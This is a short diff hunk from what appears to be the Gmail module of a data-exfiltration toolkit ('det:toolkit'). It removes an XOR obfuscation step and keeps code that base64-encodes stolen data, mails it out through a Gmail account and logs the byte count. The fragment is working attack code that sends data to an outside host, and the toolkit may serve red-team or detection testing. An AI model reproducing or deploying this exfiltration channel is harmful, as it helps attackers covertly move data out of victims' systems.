@@ -24,7 +24,6 @@ def send(data):
     msg['From'] = gmail_user
     msg['To'] = gmail_user
     msg['Subject'] = "det:toolkit"
-    data = app_exfiltrate.xor(data)
     msg.attach(MIMEText(base64.b64encode(data)))
     app_exfiltrate.log_message(
         'info', "[gmail] Sending {} bytes in mail".format(len(data)))
